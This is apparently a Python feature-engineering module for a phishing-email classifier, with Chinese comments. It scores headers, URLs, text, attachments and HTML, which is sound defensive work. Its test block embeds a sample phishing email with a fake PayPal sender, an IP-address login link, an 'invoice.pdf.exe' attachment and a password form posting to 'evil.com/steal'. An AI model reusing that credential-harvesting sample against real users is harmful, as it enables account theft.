"""
多维度特征工程模块 - 增强版
特征工程是机器学习项目的灵魂。本模块负责将 parse_email 函数输出的原始信息，
转化为一个数值化的特征向量。

增强特征体系设计（共 35+ 维）：
- 邮件头特征（8 维）：新增 SPF/DKIM 验证、发件人欺骗检测
- URL 特征（15 维）：新增 IP 地址检测、端口检测、可疑参数、URL 长度等
- 文本特征（7 维）：保持原有特征
- 附件特征（5 维）：附件数量、可疑类型、大小等
- 沙箱分析特征（3 维）：沙箱检测结果、检测率、分析状态
"""
import time
import re
import json
import os
import whois
import requests
from urllib.parse import urlparse, parse_qs
from typing import Dict, List, Optional, Set
from parse_email import parse_email
from sandbox_analyzer import analyze_attachment


# 全局白名单配置
_WHITELIST_CONFIG = None

def load_whitelist_config(config_path: str = None) -> Dict:
    """
    加载白名单配置文件。
    
    Args:
        config_path: 配置文件路径，默认为 config/whitelist.json
        
    Returns:
        Dict: 白名单配置字典
    """
    global _WHITELIST_CONFIG
    
    if _WHITELIST_CONFIG is not None:
        return _WHITELIST_CONFIG
        
    if config_path is None:
        # 尝试多个可能的路径
        possible_paths = [
            'config/whitelist.json',
            '../config/whitelist.json',
            os.path.join(os.path.dirname(__file__), '..', 'config', 'whitelist.json'),
            os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'config', 'whitelist.json')
        ]
        for path in possible_paths:
            if os.path.exists(path):
                config_path = path
                break
    
    if config_path and os.path.exists(config_path):
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                _WHITELIST_CONFIG = json.load(f)
                return _WHITELIST_CONFIG
        except Exception as e:
            print(f"加载白名单配置失败: {e}")
    
    # 使用默认配置
    _WHITELIST_CONFIG = {
        "trusted_domains": [
            "qq.com", "qlogo.cn", "mail.qq.com", "weixin.qq.com",
            "steampowered.com", "google.com", "microsoft.com"
        ],
        "trusted_senders": [],
        "verification_email_indicators": ["验证码", "verification", "verify", "code"],
        "suspicious_domain_keywords": [
            "paypa1.com", "g0ogle.com", "micros0ft.com", "amaz0n.com"
        ]
    }
    return _WHITELIST_CONFIG


def get_trusted_domains() -> Set[str]:
    """获取可信域名集合"""
    config = load_whitelist_config()
    return set(config.get("trusted_domains", []))


def get_trusted_senders() -> Set[str]:
    """获取可信发件人集合"""
    config = load_whitelist_config()
    return set(config.get("trusted_senders", []))


def get_verification_indicators() -> List[str]:
    """获取验证码邮件指示词"""
    config = load_whitelist_config()
    return config.get("verification_email_indicators", ["验证码", "verification", "verify", "code"])


def is_verification_email(subject: str, body: str) -> bool:
    """
    判断是否为验证码邮件。
    
    验证码邮件通常具有以下特征：
    - 主题或正文中包含验证码相关词汇
    - 不包含可疑链接或附件
    - 通常是纯文本或简单HTML
    
    Args:
        subject: 邮件主题
        body: 邮件正文
        
    Returns:
        bool: 是否为验证码邮件
    """
    indicators = get_verification_indicators()
    text = (subject + " " + body).lower()
    
    # 检查是否包含验证码相关词汇
    indicator_count = sum(1 for indicator in indicators if indicator.lower() in text)
    
    # 如果包含至少一个验证码指示词，可能是验证码邮件
    return indicator_count > 0


# 为了向后兼容，保留这些变量
SUSPICIOUS_DOMAIN_KEYWORDS = load_whitelist_config().get("suspicious_domain_keywords", [
    'paypa1.com', 'g0ogle.com', 'micros0ft.com', 'amaz0n.com',
    'secure-login.net', 'account-verify.com', 'bank-security.net'
])

# 紧急关键词列表
URGENT_KEYWORDS = [
    '紧急', '立即', '24 小时', '尽快', '马上', 'urgent', 'immediately',
    'activate', 'verify', 'confirm', 'suspended', 'frozen', '限', '过期',
    '警告', '危险', '风险', 'alert', 'warning', 'action required']

# 金融关键词列表
FINANCIAL_KEYWORDS = [
    '转账', '汇款', '账户', '密码', '银行卡', '付款', '支付', '充值', '提现',
    'transfer', 'payment', 'bank account', 'wire', 'refund', 'invoice',
    'credit card', 'debit card', 'paypal', 'bitcoin', 'cryptocurrency']

# 短网址服务列表
SHORT_URL_SERVICES = ['bit.ly', 'goo.gl', 'tinyurl.com', 't.co', 'ow.ly',
                      'is.gd', 'buff.ly', 'adf.ly', 'j.mp', 'tiny.cc']

# 可疑文件扩展名
SUSPICIOUS_FILE_EXTENSIONS = {
    '.exe', '.bat', '.cmd', '.com', '.pif', '.scr', '.vbs', '.vbe',
    '.js', '.jse', '.wsf', '.wsh', '.ps1', '.msi', '.msp', '.hta',
    '.cpl', '.msc', '.jar', '.dll', '.reg', '.lnk', '.docm', '.xlsm',
    '.pptm', '.dotm', '.xltm', '.potm', '.ppam', '.sldm'
}

# 常见品牌列表（用于检测仿冒）
BRAND_NAMES = [
    'paypal', 'microsoft', 'google', 'apple', 'amazon', 'facebook',
    'netflix', 'dropbox', 'linkedin', 'twitter', 'instagram',
    'icbc', 'ccb', 'abc', 'boc', 'bank of china', 'alipay', 'wechat'
]


def extract_header_features(parsed_email: Dict) -> Dict:
    """
    提取邮件头特征（增强版）。

    Returns:
        Dict: 包含 8 个邮件头特征的字典
    """
    features = {
        'is_suspicious_from_domain': 0,
        'received_hops_count': 0,
        'first_external_ip_is_blacklisted': 0,
        'spf_fail': 0,
        'dkim_fail': 0,
        'dmarc_fail': 0,
        'from_display_name_mismatch': 0,
        'from_domain_in_subject': 0,
    }

    # 检查发件人域名是否可疑
    from_email = parsed_email.get('from_email', '')
    from_domain = from_email.split('@')[-1].lower() if '@' in from_email else ''

    # 提取顶级域名（只保留最后两个部分，如 example.com）
    if from_domain:
        domain_parts = from_domain.split('.')
        if len(domain_parts) >= 2:
            top_level_domain = '.'.join(domain_parts[-2:])
        else:
            top_level_domain = from_domain
    else:
        top_level_domain = from_domain

    # 检查域名是否在可疑关键词列表中（精确匹配或包含）
    current_suspicious_keywords = load_whitelist_config().get("suspicious_domain_keywords", SUSPICIOUS_DOMAIN_KEYWORDS)
    for keyword in current_suspicious_keywords:
        if keyword in top_level_domain:
            features['is_suspicious_from_domain'] = 1
            break
    
    # 增强检测：检查域名是否包含可疑关键词
    suspicious_domain_patterns = ['suspicious', 'bank', 'security', 'verify', 'login', 'secure', 'account', 'auth']
    for pattern in suspicious_domain_patterns:
        if pattern in top_level_domain.lower():
            features['is_suspicious_from_domain'] = 1
            break
    
    # 增强检测：检查显示名是否包含可疑关键词
    from_display_name = parsed_email.get('from_display_name', '').lower()
    suspicious_display_name_patterns = ['bank', 'security', 'paypal', 'google', 'microsoft', 'amazon', 'verification']
    for pattern in suspicious_display_name_patterns:
        if pattern in from_display_name:
            features['is_suspicious_from_domain'] = 1
            break
    
    # 检查发件人是否在可信列表中
    if from_email.lower() in get_trusted_senders():
        features['is_suspicious_from_domain'] = 0  # 可信发件人覆盖可疑标记

    # Received 链长度
    received_chain = parsed_email.get('received_chain', [])
    features['received_hops_count'] = len(received_chain)

    # SPF/DKIM/DMARC 验证状态
    headers = parsed_email.get('headers', {})
    if headers.get('spf_result') == 'fail':
        features['spf_fail'] = 1
    if headers.get('dkim_result') == 'fail':
        features['dkim_fail'] = 1
    if headers.get('dmarc_result') == 'fail':
        features['dmarc_fail'] = 1

    # 检测发件人显示名欺骗
    from_display_name = parsed_email.get('from_display_name', '')
    if from_display_name:
        # 显示名包含域名但实际邮箱不匹配
        for brand in BRAND_NAMES:
            if brand.lower() in from_display_name.lower():
                if brand.lower() not in from_domain.lower():
                    features['from_display_name_mismatch'] = 1
                    break

    # 检查发件人域名是否在主题中出现（可能是仿冒）
    subject = parsed_email.get('subject', '').lower()
    if from_domain and from_domain in subject:
        features['from_domain_in_subject'] = 1

    return features


# 域名年龄缓存，避免频繁查询被限制
DOMAIN_AGE_CACHE = {}

# 可信域名白名单 - 使用动态加载
def get_trusted_domains_set() -> Set[str]:
    """获取可信域名集合（动态加载）"""
    return get_trusted_domains()


# 为向后兼容保留
TRUSTED_DOMAINS = get_trusted_domains_set()

def get_domain_age(domain: str) -> float:
    """
    查询域名注册年龄（天数）。

    Args:
        domain: 域名

    Returns:
        float: 域名注册天数，失败则返回默认值 3650(10 年)
    """
    # 检查缓存
    if domain in DOMAIN_AGE_CACHE:
        return DOMAIN_AGE_CACHE[domain]
    
    # 检查白名单（动态加载）
    domain_parts = domain.split('.')
    if len(domain_parts) >= 2:
        registered_domain = '.'.join(domain_parts[-2:])
        if registered_domain in get_trusted_domains_set():
            # 可信域名返回10年
            DOMAIN_AGE_CACHE[domain] = 3650.0
            return 3650.0

    try:
        w = whois.get(domain)
        if not w or not hasattr(w, 'creation_date'):
            return 3650.0

        creation_date = w.creation_date

        if isinstance(creation_date, list):
            creation_date = creation_date[0]

        if creation_date:
            try:
                if hasattr(creation_date, 'timestamp'):
                    age_seconds = time.time() - creation_date.timestamp()
                elif isinstance(creation_date, str):
                    dt = time.strptime(creation_date[:19], '%Y-%m-%d %H:%M:%S')
                    age_seconds = time.time() - time.mktime(dt)
                else:
                    return 3650.0

                age_days = min(age_seconds / 86400, 3650)
                DOMAIN_AGE_CACHE[domain] = age_days
                return age_days
            except Exception as e:
                pass
    except Exception as e:
        pass

    return 3650.0


def is_short_url(url: str) -> bool:
    """
    检查是否为短网址。
    """
    for service in SHORT_URL_SERVICES:
        if service in url.lower():
            return True
    return False


def query_virustotal(url: str, vt_api_key: str = "", vt_api_url: str = "https://www.virustotal.com/vtapi/v2/url/report") -> float:
    """
    查询 VirusTotal 检测率。
    """
    if not vt_api_key:
        return 0.0

    try:
        params = {'apikey': vt_api_key, 'resource': url}
        response = requests.get(vt_api_url, params=params, timeout=10)

        if response.status_code == 200:
            result = response.json()
            if result.get('response_code') == 1:
                positives = result.get('positives', 0)
                total = result.get('total', 1)
                return positives / total if total > 0 else 0.0
    except Exception as e:
        print(f"VirusTotal query error for {url}: {e}")

    return 0.0


def extract_url_features(url: str, vt_api_key: str = "", vt_api_url: str = "https://www.virustotal.com/vtapi/v2/url/report") -> Dict:
    """
    为单个 URL 提取安全特征（增强版）。

    新增特征：
    - is_ip_address: 是否为 IP 地址
    - has_port: 是否包含非标准端口
    - url_length: URL 长度
    - has_suspicious_params: 是否包含可疑参数
    - has_at_symbol: 是否包含@符号（钓鱼特征）
    - has_subdomain: 是否有多级子域名
    """
    features = {
        'domain_age_days': 3650,
        'has_https': int(url.startswith('https')),
        'is_short_url': is_short_url(url),
        'vt_detection_ratio': 0.0,
        'is_ip_address': 0,
        'has_port': 0,
        'url_length': len(url),
        'has_suspicious_params': 0,
        'has_at_symbol': 0,
        'has_subdomain': 0,
        'path_depth': 0,
        'query_length': 0,
    }

    try:
        parsed = urlparse(url if url.startswith(('http://', 'https://')) else 'http://' + url)
        domain = parsed.netloc
        path = parsed.path
        query = parsed.query

        if not domain:
            return features

        # 移除端口号
        domain_clean = domain.split(':')[0]

        # 检查是否为 IP 地址（钓鱼邮件常用）
        ip_pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
        if re.match(ip_pattern, domain_clean):
            features['is_ip_address'] = 1

        # 检查是否包含非标准端口
        if ':' in domain:
            port = domain.split(':')[-1]
            if port not in ['80', '443', '8080']:
                features['has_port'] = 1

        # 提取顶级域名（只保留最后两个部分，如 example.com）
        domain_parts = domain_clean.split('.')
        if len(domain_parts) >= 2:
            top_level_domain = '.'.join(domain_parts[-2:])
        else:
            top_level_domain = domain_clean

        # 查询 WHOIS 获取域名年龄（使用顶级域名）
        features['domain_age_days'] = get_domain_age(top_level_domain)

        # 检查域名是否包含数字或连字符
        sld = domain_clean.split('.')[0]
        if any(c.isdigit() for c in sld) or '-' in sld:
            features['has_mixed_sld'] = 1
        else:
            features['has_mixed_sld'] = 0

        # 域名长度
        features['domain_length'] = len(domain_clean)

        # 检查 URL 中的@符号（浏览器会忽略@前的内容，常用于伪装）
        if '@' in url:
            features['has_at_symbol'] = 1

        # 检查可疑参数
        suspicious_params = ['redirect', 'url', 'link', 'goto', 'return', 'next', 'auth', 'token']
        query_lower = query.lower()
        if any(param in query_lower for param in suspicious_params):
            features['has_suspicious_params'] = 1

        # 检查子域名（多级子域名可能是钓鱼）
        parts = domain_clean.split('.')
        if len(parts) > 3:
            features['has_subdomain'] = 1

        # 路径深度
        features['path_depth'] = path.count('/')

        # 查询字符串长度
        features['query_length'] = len(query)

        # 查询 VirusTotal
        if vt_api_key:
            features['vt_detection_ratio'] = query_virustotal(url, vt_api_key, vt_api_url)

    except Exception:
        # URL 分析失败静默处理
        pass

    return features


def extract_text_features(body: str, subject: str = "") -> Dict:
    """
    提取文本特征。
    """
    features = {
        'urgent_keywords_count': 0,
        'financial_keywords_count': 0,
        'text_length': 0,
        'sentiment_score': 0.0,
        'exclamation_count': 0,
        'caps_ratio': 0.0,
        'urgency_score': 0.0
    }

    if not body:
        return features

    text = body + " " + subject

    # 紧急关键词计数
    urgent_count = sum(1 for kw in URGENT_KEYWORDS if kw.lower() in text.lower())
    features['urgent_keywords_count'] = urgent_count

    # 金融关键词计数
    financial_count = sum(1 for kw in FINANCIAL_KEYWORDS if kw.lower() in text.lower())
    features['financial_keywords_count'] = financial_count

    # 文本长度
    features['text_length'] = len(text)

    # 感叹号数量
    features['exclamation_count'] = text.count('!')

    # 大写比例
    letters = ''.join(c for c in text if c.isalpha())
    if letters:
        features['caps_ratio'] = sum(1 for c in letters if c.isupper()) / len(letters)

    # 综合紧迫感评分
    urgency_factors = [
        min(urgent_count / 5, 1),
        min(financial_count / 3, 1),
        min(features['exclamation_count'] / 5, 1),
        min(features['caps_ratio'], 1)
    ]
    features['urgency_score'] = sum(urgency_factors) / len(urgency_factors)

    return features


def extract_attachment_features(parsed_email: Dict, vt_api_key: str = "") -> Dict:
    """
    提取附件特征。

    Args:
        parsed_email: 解析后的邮件数据
        vt_api_key: VirusTotal API 密钥

    Returns:
        Dict: 包含附件特征的字典
    """
    features = {
        'attachment_count': 0,
        'has_suspicious_attachment': 0,
        'has_executable_attachment': 0,
        'total_attachment_size': 0,
        'has_double_extension': 0,
        'sandbox_detected': 0,
        'max_sandbox_detection_ratio': 0.0,
        'has_sandbox_analysis': 0,
        'attachment_risk_score': 0.0,  # 新增：附件风险评分 (0-10)
    }

    attachments = parsed_email.get('attachments', [])

    if not attachments:
        return features

    features['attachment_count'] = len(attachments)

    total_size = 0
    max_detection_ratio = 0.0
    sandbox_analyzed = False
    sandbox_detected = False
    attachment_risk = 0.0
    
    for att in attachments:
        filename = att.get('filename', '').lower()
        content_type = att.get('content_type', '').lower()
        size = att.get('size', 0)
        is_suspicious = att.get('is_suspicious_type', False)

        total_size += size

        if is_suspicious:
            features['has_suspicious_attachment'] = 1
            attachment_risk += 5.0

        # 检查可执行文件类型
        ext = '.' + filename.rsplit('.', 1)[-1] if '.' in filename else ''
        if ext in ['.exe', '.bat', '.cmd', '.com', '.scr', '.vbs', '.js', '.ps1', '.msi', '.hta']:
            features['has_executable_attachment'] = 1
            attachment_risk += 10.0  # 可执行文件风险最高
        elif ext in ['.zip', '.rar', '.7z', '.tar', '.gz']:
            attachment_risk += 3.0  # 压缩文件中等风险
        elif ext in ['.pdf', '.doc', '.docx', '.xls', '.xlsx']:
            attachment_risk += 1.0  # 文档文件低风险

        # 检查双重扩展名
        parts = filename.split('.')
        if len(parts) > 2:
            if parts[-2] in ['.pdf', '.doc', '.xls', '.jpg', '.png', '.txt', '.zip']:
                features['has_double_extension'] = 1
                attachment_risk += 7.0  # 双重扩展名风险较高
        
        # 沙箱分析
        if vt_api_key:
            sandbox_result = analyze_attachment(att, vt_api_key)
            if sandbox_result.get('analyzed'):
                sandbox_analyzed = True
                analysis_result = sandbox_result.get('result', {})
                if analysis_result.get('detected'):
                    sandbox_detected = True
                detection_ratio = analysis_result.get('detection_ratio', 0.0)
                if detection_ratio > max_detection_ratio:
                    max_detection_ratio = detection_ratio

    features['total_attachment_size'] = total_size
    features['sandbox_detected'] = 1 if sandbox_detected else 0
    features['max_sandbox_detection_ratio'] = max_detection_ratio
    features['has_sandbox_analysis'] = 1 if sandbox_analyzed else 0
    # 归一化附件风险评分到 0-10
    features['attachment_risk_score'] = min(10.0, max(0.0, attachment_risk))

    return features


def extract_html_features(parsed_email: Dict) -> Dict:
    """
    提取 HTML 特征。

    Returns:
        Dict: 包含 HTML 相关特征的字典
    """
    features = {
        'has_html_body': 0,
        'html_link_count': 0,
        'has_hidden_links': 0,
        'has_form': 0,
        'has_iframe': 0,
        'has_external_script': 0,
    }

    html_body = parsed_email.get('html_body', '')
    if html_body:
        features['has_html_body'] = 1

    html_links = parsed_email.get('html_links', [])
    features['html_link_count'] = len(html_links)

    # 检查隐藏链接
    for link in html_links:
        if link.get('type') == 'link' and 'risk' in link:
            features['has_hidden_links'] = 1
            break

    # 检查隐藏链接（空文本或 display:none）
    hidden_links = parsed_email.get('html_links', [])
    for link in hidden_links:
        if 'risk' in link or link.get('type') in ['iframe', 'script']:
            if link.get('type') == 'iframe':
                features['has_iframe'] = 1
            elif link.get('type') == 'script':
                features['has_external_script'] = 1

    html_forms = parsed_email.get('html_forms', [])
    if html_forms:
        features['has_form'] = 1

    return features


def aggregate_url_features(url_features_list: List[Dict]) -> Dict:
    """
    聚合多个 URL 的特征。
    """
    if not url_features_list:
        return {
            'avg_domain_age_days': 3650,
            'max_vt_detection_ratio': 0,
            'min_has_https': 1,
            'short_url_count': 0,
            'mixed_sld_count': 0,
            'max_domain_length': 0,
            'ip_address_count': 0,
            'port_count': 0,
            'at_symbol_count': 0,
            'subdomain_count': 0,
            'suspicious_param_count': 0,
            'avg_url_length': 0,
            'avg_path_depth': 0,
            'max_query_length': 0,
        }

    count = len(url_features_list)
    return {
        'avg_domain_age_days': sum(f['domain_age_days'] for f in url_features_list) / count,
        'max_vt_detection_ratio': max(f['vt_detection_ratio'] for f in url_features_list),
        'min_has_https': min(f['has_https'] for f in url_features_list),
        'short_url_count': sum(f['is_short_url'] for f in url_features_list),
        'mixed_sld_count': sum(f.get('has_mixed_sld', 0) for f in url_features_list),
        'max_domain_length': max(f.get('domain_length', 0) for f in url_features_list),
        'ip_address_count': sum(f.get('is_ip_address', 0) for f in url_features_list),
        'port_count': sum(f.get('has_port', 0) for f in url_features_list),
        'at_symbol_count': sum(f.get('has_at_symbol', 0) for f in url_features_list),
        'subdomain_count': sum(f.get('has_subdomain', 0) for f in url_features_list),
        'suspicious_param_count': sum(f.get('has_suspicious_params', 0) for f in url_features_list),
        'avg_url_length': sum(f.get('url_length', 0) for f in url_features_list) / count,
        'avg_path_depth': sum(f.get('path_depth', 0) for f in url_features_list) / count,
        'max_query_length': max(f.get('query_length', 0) for f in url_features_list),
    }


def check_domain_similarity(domain1: str, domain2: str) -> bool:
    """
    检查两个域名是否相似（用于检测仿冒）。

    Args:
        domain1: 域名 1
        domain2: 域名 2

    Returns:
        bool: 是否相似
    """
    # 移除常见 TLD 进行比较
    def normalize(d):
        d = d.lower()
        for tld in ['.com', '.net', '.org', '.cn', '.io', '.co']:
            d = d.replace(tld, '')
        # 常见混淆替换
        d = d.replace('0', 'o').replace('1', 'l').replace('3', 'e').replace('@', 'a')
        return d

    return normalize(domain1) == normalize(domain2)


def build_feature_vector(parsed_email: Dict, vt_api_key: str = "", vt_api_url: str = "https://www.virustotal.com/vtapi/v2/url/report") -> Dict:
    """
    构建完整的邮件特征向量（增强版，35+ 维）。

    Args:
        parsed_email: 解析后的邮件数据
        vt_api_key: VirusTotal API 密钥
        vt_api_url: VirusTotal API 的 URL

    Returns:
        Dict: 完整的特征向量字典
    """
    # 邮件头特征
    header_features = extract_header_features(parsed_email)

    # URL 特征
    urls = parsed_email.get('urls', [])
    url_features_list = [extract_url_features(url, vt_api_key, vt_api_url) for url in urls]
    aggregated_url_features = aggregate_url_features(url_features_list)

    # 文本特征
    body = parsed_email.get('body', '')
    html_body = parsed_email.get('html_body', '')
    subject = parsed_email.get('subject', '')
    text_features = extract_text_features(body + html_body, subject)

    # 附件特征（包含沙箱分析）
    attachment_features = extract_attachment_features(parsed_email, vt_api_key)

    # HTML 特征
    html_features = extract_html_features(parsed_email)

    # 合并所有特征
    feature_vector = {
        **header_features,
        **aggregated_url_features,
        **text_features,
        **attachment_features,
        **html_features,
        'url_count': len(urls),
    }

    return feature_vector


def vector_to_list(feature_vector: Dict) -> List[float]:
    """
    将特征字典转换为列表格式，便于模型预测。
    """
    FEATURE_COLUMNS = [
        # 邮件头特征 (8 维)
        'is_suspicious_from_domain', 'received_hops_count',
        'first_external_ip_is_blacklisted',
        'spf_fail', 'dkim_fail', 'dmarc_fail',
        'from_display_name_mismatch', 'from_domain_in_subject',

        # URL 特征 (14 维)
        'avg_domain_age_days', 'max_vt_detection_ratio',
        'min_has_https', 'short_url_count', 'mixed_sld_count',
        'max_domain_length',
        'ip_address_count', 'port_count',
        'at_symbol_count', 'subdomain_count', 'suspicious_param_count',
        'avg_url_length', 'avg_path_depth', 'max_query_length',

        # 文本特征 (7 维)
        'urgent_keywords_count', 'financial_keywords_count',
        'text_length', 'urgency_score', 'exclamation_count',
        'caps_ratio', 'url_count',

        # 附件特征 (5 维)
        'attachment_count', 'has_suspicious_attachment',
        'has_executable_attachment', 'total_attachment_size',
        'has_double_extension',

        # HTML 特征 (5 维)
        'has_html_body', 'html_link_count', 'has_hidden_links',
        'has_form', 'has_iframe',
    ]

    return [float(feature_vector.get(col, 0)) for col in FEATURE_COLUMNS]


if __name__ == "__main__":
    # 测试示例 - 带附件的钓鱼邮件
    test_email = """From: "PayPal Security" <security@paypa1.com>
To: user@example.com
Subject: 【紧急】您的 PayPal 账户需要立即验证

Content-Type: multipart/mixed; boundary="boundary123"

--boundary123
Content-Type: text/html; charset="utf-8"

<html>
<body>
尊敬的客户，
<br><br>
我们检测到您的账户有异常活动。<a href="http://192.168.1.100:8080/login?redirect=paypal.com">立即点击此处验证</a>
<br><br>
如果不立即处理，您的账户将在 24 小时内被冻结！
<br><br>
<form action="http://evil.com/steal" method="POST">
<input type="password" name="password">
<input type="submit" value="验证">
</form>
</body>
</html>

--boundary123
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="invoice.pdf.exe"

[malicious payload]

--boundary123--
"""

    parsed = parse_email(test_email)
    features = build_feature_vector(parsed, vt_api_key="")

    print("=" * 60)
    print("增强版特征向量")
    print("=" * 60)
    for k, v in sorted(features.items()):
        print(f"  {k}: {v}")

    print("\n" + "=" * 60)
    print("特征向量列表:")
    print(vector_to_list(features))
    print("=" * 60)
